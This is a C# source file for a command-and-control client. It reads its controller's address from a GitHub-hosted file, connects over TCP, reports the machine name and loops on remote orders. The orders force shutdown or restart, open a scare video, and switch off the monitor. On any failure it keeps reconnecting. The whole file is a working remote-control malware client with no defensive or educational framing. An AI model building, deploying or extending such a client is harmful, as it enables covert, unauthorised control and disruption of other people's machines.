using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace C2
{
    internal class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int SW_Min = 2;
        const int SW_Max = 3;
        const int SW_Norm = 4;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

        static private int MaxReadByte = 2024;
        static private void Write(Stream stream, string text)
        {
            if (stream.CanWrite)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.Write(buffer, 0, buffer.Length);
                stream.Flush();
            }
        }
        static private string Read(Stream stream)
        {
            string requst = "not connect";
            if (stream.CanRead)
            {
                byte[] buffer = new byte[MaxReadByte];
                int size = stream.Read(buffer, 0, buffer.Length);
                requst = Encoding.UTF8.GetString(buffer, 0, size);
            }
            return requst;

        }
        static void Main()
        {
            ShowWindow(GetConsoleWindow(), SW_SHOW);
            Console.WriteLine("Start");
        start:
            
            string host = "";
            int port = 00000;
            try
            {

                using (WebClient web = new WebClient())
                {
                    using (Stream webStream = web.OpenRead("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_server_connection"))
                    {
                        using (StreamReader read = new StreamReader(webStream))
                        {
                            string[] arr = read.ReadLine().Split(":");
                            host = arr[0];
                            port = int.Parse(arr[1]);

                        }
                    }
                }

               /* host = "127.0.0.1";
                port = 25565;*/



                using (TcpClient client = new TcpClient())
                {
                    client.Connect(host, port);
                    using (Stream stream = client.GetStream())
                    {

                        if (client.Connected)
                        {
                            string username = System.Environment.MachineName;
                            Write(stream, username);
                            Console.WriteLine(Read(stream));
                            while (true)
                            {
                                string command_for_Server = Read(stream);
                                if (command_for_Server == "close")
                                {
                                    Write(stream, "close");
                                    Console.WriteLine("client close");
                                    break;
                                }
                                else if (command_for_Server == "users")
                                {
                                    Write(stream, "users");
                                }
                                else if (command_for_Server == "pc_off")
                                {
                                    Write(stream, "pc_off");
                                    Thread.Sleep(1000);
                                    Process.Start("shutdown", "/s /t 0");
                                }
                                else if (command_for_Server == "pc_off_on")
                                {
                                    Write(stream, "pc_off_on");
                                    Thread.Sleep(1000);
                                    var psi = new ProcessStartInfo("shutdown", "/r /t 0");
                                    psi.CreateNoWindow = true;
                                    psi.UseShellExecute = false;
                                    Process.Start(psi);
                                }
                                else if (command_for_Server == "screamer")
                                {
                                    Write(stream, "screamer");
                                    System.Diagnostics.Process.Start(new ProcessStartInfo
                                    {
                                        FileName = "https://www.youtube.com/watch?v=5p5d1vflc_g",
                                        UseShellExecute = true
                                    });
                                }
                                else if (command_for_Server == "monitor_off")
                                {
                                    Write(stream, "monitor_off");
                                    SendMessage(0xFFFF, 0x112, 0xF170, (int)2);
                                }
                                else
                                {
                                    Write(stream, "ERROR ANSWER");
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e) {
                Thread.Sleep(5000);
                goto start;
            
            }
        }
    }
}
